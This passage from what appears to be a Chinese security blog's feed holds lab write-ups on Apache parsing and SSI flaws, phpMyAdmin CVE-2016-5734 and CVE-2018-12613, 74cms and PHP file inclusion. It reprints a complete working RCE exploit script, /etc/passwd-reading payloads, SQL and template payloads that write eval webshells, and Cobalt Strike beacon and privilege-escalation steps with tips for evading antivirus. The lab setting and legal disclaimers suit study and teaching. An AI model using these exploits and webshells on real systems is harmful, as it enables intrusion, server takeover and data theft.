进行截包 篡改16进制 hex 的标识 这里是演示的 phpinfo() 函数，同样也可以用 eval() 函数写入一句话木马 多后缀解析漏洞 Apache httpd 多后缀解析漏洞靶场：apache_parsing_vulnerability Apache Httpd支持一个文件拥有多个后缀,并为不同后缀执行不同的指令我们上传的文件中只要后缀名含有php,该文件就可以被解析成php文件比如,如下配置文件 AddType text/html .html AddLanguage zh-CN .cn 其给 .html 后缀增加了 media-type,值为text/html; 给 .cn 后缀增加了语言,值为zh-CN; 此时,如果用户请求文件 index.cn.html 他将返回一个中文的 html 页面。以上就是 Apache 多后缀的特性。如果运维人员给 .php 后缀增加了处理器如下： AddHandler application/x-httpd-php .php 那么,在有多个后缀的情况下,只要一个文件含有 .php 后缀的文件即将被识别成 PHP 文件,没必要是最后一个后缀。利用这个特性,将会造成一个可以绕过上传白名单的解析漏洞 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd httpd/apache_parsing_vulnerability # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 漏洞复现 SSI 远程命令执行漏洞 Apache httpd SSI 远程命令执行漏洞：ssi-rce 在测试任意文件上传漏洞的时候,目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持,我们可以上传一个shtml文件,并利用&lt;!--#exec cmd=\"id\"--&gt;语法执行任意命令 什么是shtml 引用:https://www.cnblogs.com/alantao/p/6565029.html htm、html、shtml网页区别 首先htm、html、shtml都是静态网页的后缀，三者也可以说都是只是扩展名不同，其他一样，都是静态的网页。 Htm和html是完全静态的网页不通过服务器编译解释直接送出给浏览器读取的静态网页，以Htm和html伪静态Request除外。 html、htm、shtml、shtm均是静态html网页。都是网页文件后缀名不同的html网页扩展名。 Html与htm .html与.htm均是静态网页后缀名，网页文件没有区别与区分，html与htm后缀网页后缀可以互换，对网页完全没有影响同时也没有区别。可以认为html与htm没有本质区别，唯一区别即多与少一个“L”。 Shtml与shtm shtml命名的网页文件里，使用了ssi的一些指令，就像asp中的指令，你可以在SHTML文件中写入SSI指令，当客户端访问这些shtml文件时，服务器端会把这些SHTML文件进行读取和解释，把SHTML文件中包含的SSI指令解释出来。 而shtml与shtm后缀的网页文件没有区别，后缀名可以互换，区别在于和html与htm一样多与少“L”。 Html与shtml区别 本质上都属于静态网页一种，html属于纯静态，客户端浏览器读取html文件是什么就呈现给浏览者什么内容。而shtml则可以使用SSI。 shtml的SSI功能 SSI是为WEB服务器提供的一套命令，这些命令只要直接嵌入到HTML文档的注释内容之中即可。如：&lt;!--#include file=\"info.htm\"--&gt; 就是一条SSI指令，其作用是将”info.htm”的内容拷贝到当前的页面中，当访问者来浏览时，会看到其它HTML文档一样显示info.htm其中的内容。 假如我们A页面是shtml的静态网页，而A页面里我们使用了include包含嵌入B静态html页面，如果你的服务器空间支持Shtml SSI这个时候我们，浏览器打开A页面时候，就会在A页面显示A原本内容以及B页面内容，我们查看网页源代码，不会发现B页面引入痕迹，而是看到B页面内容完全在A页面里。 什么是SSI SSI提供了一种对现有HTML文档增加动态内容的方法,即在html中加入动态内容 SSI是嵌入HTML页面中的指令,在页面被提供时由服务器进行运算,以对现有HTML页面增加动态生成的内容,而无须通过CGI程序提供其整个页面,或者使用其他动态技术。 SSI是一种增加小段动态信息的好方法,比如当前时间。如果你的页面大部分内容是在被提供时动态生成的,那就要另找方案了。 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd httpd/ssi-rce # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 漏洞复现&lt;!--#exec cmd=\"whoami\"--&gt;","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"Apache","slug":"Apache","permalink":"https://www.adalucky.com/tags/Apache/"},{"name":"解析漏洞","slug":"解析漏洞","permalink":"https://www.adalucky.com/tags/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"SSI远程命令执行","slug":"SSI远程命令执行","permalink":"https://www.adalucky.com/tags/SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"author":"Ada"},{"title":"PhpMyAdmin","slug":"Security/PhpMyAdmin","date":"2021-08-11T06:35:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/phpmyadmin/","link":"","permalink":"https://www.adalucky.com/security/phpmyadmin/","excerpt":"phpMyAdmin是一个非常受欢迎的基于web的MySQL数据库管理工具。它能够创建和删除数据库，创建/删除/修改表格,删除/编辑/新增字段，执行SQL脚本等","text":"phpMyAdmin是一个非常受欢迎的基于web的MySQL数据库管理工具。它能够创建和删除数据库，创建/删除/修改表格,删除/编辑/新增字段，执行SQL脚本等 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 序列化和反序列化 序列化:把对象转换为字节序列 反序列化:把字节序列恢复为原先的对象 各种语言都有反序列化漏洞 序列化即将对象转化为字节流,便于保存在文件,内存,数据库中; 反序列化即将字节流转化为对象也就是把数据转化为一种可逆的数据结构,再把这种可逆的数据结构转化回数据,这就是序列化与反序列化 看到过一个通俗的例子(可以应用到很多场景中,比如网络数据包传递接收过程之类的),买一个柜子,从北京运到上海,由于柜子形状怪异,不方便运输,先把它拆成板子再装到箱子里，邮递到家后把板子重新拼装回柜子 phpmyadmin介绍 phpmyadmin是一个以php为基础,以Web-Base方式架构在网站主机上的 MySQLI的数据库管理工具,让管理者可以使用Web接口管理MSQL数据库。借由此Web接口可以成为一个简单方式输入sαL语法的较佳途径。其优势就是可以通过web界面来远程管理方便建立、修改、删除数据库及资料表 phpmyadmin测试流程 确认 phpmyadmin 的后台 如果有密码 可以用phpmyadmin 密码爆破工具 确定版本,信息搜集 漏洞利用 vulhub搭建环境搭建 github：https://github.com/vulhub/vulhub vulhub官网：https://vulhub.org/ 利用条件 phpmyadmin 2.x版本中存在一处反序列化漏洞,通过该漏洞,攻击者可以读取任意文件或执行任意代码。 phpmyadmin 2.X 需要登录 Linux安装vulhub# 安装pip curl -s https://bootstrap.pypa.io/get-pip.py | python3 # 安装最新版docker curl -s https://get.docker.com/ | sh # 启动docker服务 systemctl start docker # 安装compose pip install docker-compose # 下载项目 wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip unzip vulhub-master.zip cd vulhub-master # 进入某一个漏洞/环境的目录 cd /phpmyadmin/WooYun-2016-199433 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 练习反序列化 利用 vulhub 中的 WooYun-2016-199433 进行练习 启动 注意8080端口已开启 不冲突 # 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd phpmyadmin/WooYun-2016-199433 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 我们访问后发现 版本是 phpMyAdmmin 2.7.1-dev 那么就可以通过关键字去搜集对应的漏洞进行复现，这就是一般的测试流程 漏洞复现url：http://www.security.ada:8080/scripts/setup.php payload: action=test&amp;configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";} 命令执行 利用 vulhub 中的 CVE-2016-5734 进行练习 启动 注意 8080 端口已开启 不冲突 # 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 cd /phpmyadmin/CVE-2016-5734 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 登录后我们可以看到 phpmyadmin 的版本信息 那么就可以去搜集对应版本的漏洞了 漏洞复现影响版本 4.0.10.16 之前4.0.x版本 4.4.15.7 之前4.4x版本 4.6.3 之前4.6×版本 php版本: 4.3.0-5.46 php5.0 版本以上的将 preg_ replace 的/e修饰符给废弃掉了 漏洞的原理 reg_replace漏洞触发有两个前提 第一个参数需要e标识符,有了它可以执行第二个参数的命令 第一个参数需要在第三个参数中的中有匹配,不然echo会返回第三个参数而不执行命令。 背景知识 preg_replace函数执行一个正则表达式的搜索和替换 在PHP5.4.7以前,preg_ replace的第—个参数可以利用\\O进行截断,并将正则模式修改为e。众所周知,e模式的正则支持执行代码,此时将可构造一个任意代码执行漏洞 poc 利用复现cd /Volumes/share/study/security python3 cve-2016-5734_rce.py -u root -p \"root\" http://www.security.ada:8080/ -c \"system('cat /etc/passwd')\" python 脚本如下 #!/usr/bin/env python \"\"\"cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7. CVE: CVE-2016-5734 Author: https://twitter.com/iamsecurity run: ./cve-2016-5734.py -u root --pwd=\"\" http://localhost/pma -c \"system('ls -lua');\" \"\"\" import requests import argparse import sys __author__ = \"@iamsecurity\" if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument(\"url\", type=str, help=\"URL with path to PMA\") parser.add_argument(\"-c\", \"--cmd\", type=str, help=\"PHP command(s) to eval()\") parser.add_argument(\"-u\", \"--user\", required=True, type=str, help=\"Valid PMA user\") parser.add_argument(\"-p\", \"--pwd\", required=True, type=str, help=\"Password for valid PMA user\") parser.add_argument(\"-d\", \"--dbs\", type=str, help=\"Existing database at a server\") parser.add_argument(\"-T\", \"--table\", type=str, help=\"Custom table name for exploit.\") arguments = parser.parse_args() url_to_pma = arguments.url uname = arguments.user upass = arguments.pwd if arguments.dbs: db = arguments.dbs else: db = \"test\" token = False custom_table = False if arguments.table: custom_table = True table = arguments.table else: table = \"prgpwn\" if arguments.cmd: payload = arguments.cmd else: payload = \"system('uname -a');\" size = 32 s = requests.Session() # you can manually add proxy support it's very simple ;) # s.proxies = {'http': \"127.0.0.1:8080\", 'https': \"127.0.0.1:8080\"} s.verify = False sql = '''CREATE TABLE `{0}` ( `first` varchar(10) CHARACTER SET utf8 NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500')); '''.format(table) # get_token resp = s.post(url_to_pma + \"/?lang=en\", dict( pma_username=uname, pma_password=upass )) if resp.status_code is 200: token_place = resp.text.find(\"token=\") + 6 token = resp.text[token_place:token_place + 32] if token is False: print(\"Cannot get valid authorization token.\") sys.exit(1) if custom_table is False: data = { \"is_js_confirmed\": \"0\", \"db\": db, \"token\": token, \"pos\": \"0\", \"sql_query\": sql, \"sql_delimiter\": \";\", \"show_query\": \"0\", \"fk_checks\": \"0\", \"SQL\": \"Go\", \"ajax_request\": \"true\", \"ajax_page_request\": \"true\", } resp = s.post(url_to_pma + \"/import.php\", data, cookies=requests.utils.dict_from_cookiejar(s.cookies)) if resp.status_code == 200: if \"success\" in resp.json(): if resp.json()[\"success\"] is False: first = resp.json()[\"error\"][resp.json()[\"error\"].find(\"&lt;code&gt;\")+6:] error = first[:first.find(\"&lt;/code&gt;\")] if \"already exists\" in error: print(error) else: print(\"ERROR: \" + error) sys.exit(1) # build exploit exploit = { \"db\": db, \"table\": table, \"token\": token, \"goto\": \"sql.php\", \"find\": \"0/e\\0\", \"replaceWith\": payload, \"columnIndex\": \"0\", \"useRegex\": \"on\", \"submit\": \"Go\", \"ajax_request\": \"true\" } resp = s.post( url_to_pma + \"/tbl_find_replace.php\", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies) ) if resp.status_code == 200: result = resp.json()[\"message\"][resp.json()[\"message\"].find(\"&lt;/a&gt;\")+8:] if len(result): print(\"result: \" + result) sys.exit(0) print( \"Exploit failed!\\n\" \"Try to manually set exploit parameters like --table, --database and --token.\\n\" \"Remember that servers with PHP version greater than 5.4.6\" \" is not exploitable, because of warning about null byte in regexp\" ) sys.exit(1) 文件包含 利用 vulhub 中的 CVE-2018-12613 进行练习 启动# 进入vulhub cd vulhub-master # 进入某一个漏洞/环境的目录 phpmyadmin/CVE-2018-12613 # 自动化编译环境 docker-compose build # 启动整个环境 docker-compose up -d # 测试完成后，删除整个环境 docker-compose down -v 启动后我们访问目标地址就可以看到 phpmyadmin 的版本信息 那么就可以去搜集对应版本的漏洞了 漏洞复现影响版本 phpMyAdmin 4.8.0 和 4.8.1 漏洞描述 https://blog.csdn.net/weixin_43872099/article/details/104128639 文件包含利用http://www.security.ada:8080/index.php?target=db_sql.php%253f/../../../../../../../etc/passwd Session 包含普通日志文件包含http://www.security.ada:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_0e0f905f1ab6df1d67d92ffb7cca2493 插入sql语句后包含 把php函数写到日志中，然后通过 session 包含日志 执行显示phpinfo SELECT &lt;?=phpinfo()?&gt; http://www.security.ada:8080/index.php?target=db_sql.php%253f/../../../../../../../etc/passwd http://www.security.ada:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_f2e93353d686dc3808f0f8da15929df4 phpStudy获取shell eval 宝塔会进行拦截 assert 写入shell进入后台 phpmyadmin 的默认账户密码都是 root 如果不对可以用 phpmyadmin 的爆破工具进行爆破 获取日志路径及状态SHOW VARIABLES LIKE '%general%'; 修改日志路径及状态 此步骤是为了开启日志和修改日志的写入地址为我们自己设定的地址 set global general_log=on; set global general_log_file='C:/phpstudy2018/PHPTutorial/WWW/shell.php'; 写入shellSELECT '&lt;?php @eval($_POST[\"hacker\"]); ?&gt;'; # 备用：SELECT '&lt;?php assert($_POST[\"hacker\"]); ?&gt;'; 验证shellUrl:http://192.168.151.8/shell.php Payload:hacker= echo \"----------------this is test----------------\"; 主机渗透蚁剑连接 刚才已经能够在 HackBar 执行 echo 输出了证明是可以的，现在就用蚁剑进行连接 如果连接失败 多次尝试修改一下 php 的版本 准备工作启动Cobalt Strike server端并连接 创建开启监听 通过PowerShell 渗透 前提条件：能通过蚁剑进入目标机器的终端执行命令 通过exe程序渗透生成exe可执行程序 蚁剑上传exe 执行 exe 通过执行刚才生成的 artifact.exe 文件让主机上线 在测试中可以设置Sleep为 0 或者 5 这样延时更短，默认是60 在正式中最好保持60 不然程序执行过于频繁容易被监测到 触发一些杀毒的报警 提升权限 当我们接受到设备的上线 如果不是 * 号用户 也就是不是系统权限用户，那么会有很多的限制，这个时候需要进行权限的提上，获取 SYSTEM 用户的权限 演示条件：win7环境 存在 MS-14058 漏洞 elevate.cna插件下载地址：https://github.com/rsmudge/ElevateKit Cobalt Strike 加载插件：点击左上角【Cobalt Strike】-&gt; 【Script Manager】-&gt; 【Load】选择刚才下载的 elevate.cna 断开连接 当测试完成后 我们需要断开监听，但是 Cobalt Strike 这边删除后还是会收到靶机的心跳，因此需要关闭靶机 刚才启动的 artifact.exe 进程","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"远程命令执行","slug":"远程命令执行","permalink":"https://www.adalucky.com/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"文件包含","slug":"文件包含","permalink":"https://www.adalucky.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"反序列化","slug":"反序列化","permalink":"https://www.adalucky.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"Ada"},{"title":"74cms","slug":"Security/74cms","date":"2021-08-11T05:55:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/74cms/","link":"","permalink":"https://www.adalucky.com/security/74cms/","excerpt":"骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套免费 + 开源专业人才网站系统。","text":"骑士cms人才系统，是一项基于PHP+MYSQL为核心开发的一套免费 + 开源专业人才网站系统。 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 练习74cms下载 下载地址：http://www.74cms.com/download/index.html 注意事项： 骑士 cms 不支持php7.x 复现环境为 php5.x 即可 安装文件版本低于6.0.48 php版本大于5.3 安装 将下载的压缩包文件解压自定义命名，以 74cms 为例 如果之前有安装 74cms 那么再次安装的时候 数据库不能重名不然会覆盖安装 可以选择删除或者命名不重复即可 安装向导 安装时注意php版本大于5.3 同时注意骑士cms不支持 php7.x 验证 ThinkPHP 是否存在 http://192.168.151.8/74cms/index.php?m=Home&amp;a=assign_resume_tpl shell 执行HackBar 执行 post 请求并通过BurpSuite篡改内容 日志路径：C:\\phpstudy2018\\PHPTutorial\\WWW\\74cms\\data\\Runtime\\Logs\\Home url：http://192.168.151.8/74cms/index.php?m=Home&amp;a=assign_resume_tpl variable=1&amp;tpl=&lt;?php fputs(fopen(\"shell.php\",\"w\"),\"&lt;?php eval(\\$_POST[x]);?&gt;\")?&gt;;ob_flush();?&gt;/r/n&lt;qscms/company_show 列表名=\"info\" 企业id=\"$_GET['ID']\"/&gt; variable=1&amp;tpl=&lt;?php fputs(fopen(\"shell.php\",\"w\"),\"&lt;?php eval(\\$_POST[x]);?&gt;\")?&gt;;ob_flush();?&gt;/r/n&lt;qscms/company_show h=\"info\" id=\"$_GET['ID']\"/&gt; 生成 shell.phpvariable=1&amp;tpl=data/Runtime/Logs/Home/21_08_11.log 执行shellx= echo \"hello word\";","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"74cms","slug":"74cms","permalink":"https://www.adalucky.com/tags/74cms/"},{"name":"远程命令执行","slug":"远程命令执行","permalink":"https://www.adalucky.com/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"author":"Ada"},{"title":"文件包含漏洞复现","slug":"Security/文件包含漏洞","date":"2021-08-09T11:55:32.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/wen-jian-bao-han-lou-dong/","link":"","permalink":"https://www.adalucky.com/security/wen-jian-bao-han-lou-dong/","excerpt":"程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含","text":"程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 如果喜欢我的文章欢迎各位大佬点击右下角的订阅图标开启浏览器推送吧，这样你只要不清除浏览器缓存就能第一时间收到我的更新通知啦（如果你的网络如果能上Google就用Chrome浏览器订阅，如果不能推荐用微软的Edge浏览器，目前正在寻找解决办法，订阅成功后会有一条提示成功，如果未收到表示网络限制原因未订阅成功） 中华人民共和国网络安全法(2017年6月1日起施行) 第二十二条任何个人和组织不得从事入侵他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动;不得提供从事入侵网络、干扰网络正常功能、窃取网络数据等危害网络安全活动的工具和制作方法;不得为他人实施危害网络安全的活动提供技术支持、广告、推广、支付结算等帮助。 第三十八条任何个人和组织不得窃取或者以其他非法方式获取公民个人信息,不得出售或者非法向他人提供公民个人信息 第六十三条违反本法规定,给他人造成损害的,依法承担民事责任 第六十四条违反本法规定,构成犯罪的,依法追究刑事责任 中华人民共和国刑法(285286) 第二百八十五条违反国家规定,侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的处三年以下有期徒刑或者拘役 第二百八十六条违反国家规定,对计算机信息系统功能进行删除、修改、增加、干扰,造成计算机信息系统不能正常运行,后果严重的,处五年以下有期徒刑或者拘役:后果特别严重的,处五年以上有期徒刑。违反国家规定,对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作,后果严重的,依照前款的规定处罚 中华人民共和国刑法修正案7(第九条) 在刑法第二百八十五条中增加两款作为第二款、第三款:“违反国家规定,侵入前款规定以外的计算机信息系统或者采用其他技术手段,获取该计算机信息系统中存储、处理或者传输的数据,或者对该计算机信息系统实施非法控制,情节严重的,处三年以下有期徒刑或者拘役,并处或者单处罚金:情节特别严重的,处三年以上七年以下有期徒刑,并处罚金提供专门用于侵入、非法控制计算机信息系统的程序、或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具,情节严依照前款的规定处罚。 文件包含漏洞文件包含定义 为了更好地使用代码的重用性,引入了文件包含函数,可以通过文件包含函数将文件包含进来,直接使用包含文件的代码 程序开发人员通常会把可重复使用的函数写到单个文件中,在使用某些函数时,直接调用此文件,无需再次编写,这种调用文件的过程一般被称为文件包含。服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码,并且当PHP来执行,这会为开发者节省大量的时间 PHP文件包含函数require() require()与 include()的区别在于 require()执行如果发生错误,函数会输出错误信息,并终止脚本的运行 require_once() 功能与 require()相同,区别在于当重复调用同一文件时,程序只调用一次 include() 当使用该函数包含文件时,只有代码执行到 include()函数时才将文件包含进来,发生错误时只给出一个警告,继续向下执行 include_once() 功能与 Include()相同,区别在于当重复调用同一文件时,程序只调用一次 文件包含漏洞 文件包含函数加载的参数没有经过过滤或者严格的定义,可以被用户控制,包含其他恶薏文件,导致了执行了非预期的代码一股文件包含漏洞多出现在php中较多 文件包含漏洞分类本地文件包含漏洞LFI 本地文件包含漏洞LF( Local File Inclusion ): 指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。 远程文件包含漏洞RFI 远程文件包含漏洞RFI( Remote File Inclusion): 是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的,因此漏洞一旦存在危害性会很大。但RFI的利用条件较为苛刻,需要对php. in中进行配置 phpStudy配置：其他选项菜单-&gt;PHP扩展及设置-&gt;参数开关设置-&gt;☑️allow_url_include ☑️allow_url_fopen,详情参看下图说明 两个配置选项均需要为on,才能远程包含文件成功。在php.ini中, allow_url_fopen默认一直是On,而 allow_url_include从php5.2之后就默认为Off allow_url_fopen = On allow_url_include= On 本地文件包含无限制本地文件包含 文件包含可以包含任意文件,即便被包含的文件并不是与当前编程语言相关,甚至为图片,只要文件被包含,其内容会被包含文件包含,并以当前服务器脚本语言执行。如果包含的文件内容不符合php语言语法的,会直接将文件内容输出 http://192.168.151.8/mytest/file.php?filename=phpinfo.txt //文件名 &lt;?php $filename = $_GET['filename']; include($filename); ?&gt; //被包含文件: phpinfo.txt &lt;?php phpinfo(); ?&gt; 限制文件包含 开发者限制了被包含文件的后缀名 绕过条件：php.ini 配置文件中 magic_quotes_gpc = off PHP版本小于5.3 对可控参数未使用 addslashes函数,满足这三个条件就可以使用%00截断。一定条件下可以使用%00,因为当程序流遇到%00终止符的时候将直接终止 如果没有效果重启一下phpStudy。 magic_quotes_gpc 函数在php中的作用是判断解析用户提示的数据,如包括有:post、get、 cookie过来的数据增加转义字符\"\\\",以确保这些 数据不会引起程序,特别是数据库语句因为特殊字符引起的污染而岀现致命的错误 addslashes()函数返回在预定义字符之前添加反斜杠的字符串。 http://192.168.151.8/mytest/test.php?filename=phpinfo.txt%00 //文件名 &lt;?php $filename = $_GET['filename'] . '.php'; echo $file; include($filename); ?&gt; session 文件包含查看 session 存储位置 利用条件：session 的存储位置可以获取，本文章中之前已经能执行 phpinfo.txt了，那么在返回的页面通过查找关键字 session.save_path 查找到我们的存储位置为 C:\\phpstudy2018\\PHPTutorial\\tmp\\tmp linux下默认存储在/var/lib/php/session目录下 session的文件名为sess_+ sessionid 如：【sess_sgu4g2mpobbj6m173qbvjlbkc6】 获取session上传session内容可控测试代码&lt;?php session_start(); $ctfs=$_GET['ctfs']; $_SESSION[\"username\"]=$ctfs; ?&gt; 执行文件获取session http://192.168.151.8/mytest/session.php?ctfs=\\ 通过 sessionID 执行文件包含 http://192.168.151.8/mytest/file.php?filename=C:\\phpstudy2018\\PHPTutorial\\tmp\\tmp\\sess_9598028fef9f78b98e3ae624c608d5c9 日志文件包含 没有上传点,并且也没有 url_allow_include功能时,我们就可以考虑包含服务器的日志文件利用思路也比较简单,当我们访问网站时,服务器的日志中都会记录我们的行为,当我们访问链接中包含PHP一句话木马时,也会被记录到日志 漏洞利用条件 日志的物理存放路径 存在文件包含漏洞 以 Apache 日志文件为例 phpstudy默认关闭了 apache的日志功能 所以需要先开启，找到httpd-conf文件下的CustomLog \"logs/access.log\" common 去掉前面的注释后重启如下图 日志文件存在路径：C:\\phpstudy2018\\PHPTutorial\\Apache\\logs","categories":[{"name":"Security","slug":"Security","permalink":"https://www.adalucky.com/categories/Security/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://www.adalucky.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"author":"Ada"},{"title":"测试流程与 cms 系统介绍","slug":"Security/测试流程","date":"2021-08-08T17:30:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/security/ce-shi-liu-cheng/","link":"","permalink":"https://www.adalucky.com/security/ce-shi-liu-cheng/","excerpt":"CMS是英语 Content Management System 的缩写,按英语的字面翻译就是内容管理系统,它主要是为了方便发布网络内容而存在的一体化Web管理系统","text":"CMS是英语 Content Management System 的缩写,按英语的字面翻译就是内容管理系统,它主要是为了方便发布网络内容而存在的一体化Web管理系统 前置申明 本博客所有内容均为作者的个人学习笔记记录，作者也是小白一枚，如果有什么地方写的不对或者对您带来影响欢迎底部留言或者点击右下角的图标与我联系吧 本博客的所有 Security 大类下的文章只能作为学习研究使用，不可用于非法测试和攻击，请遵循网络安全法，共筑和谐网络 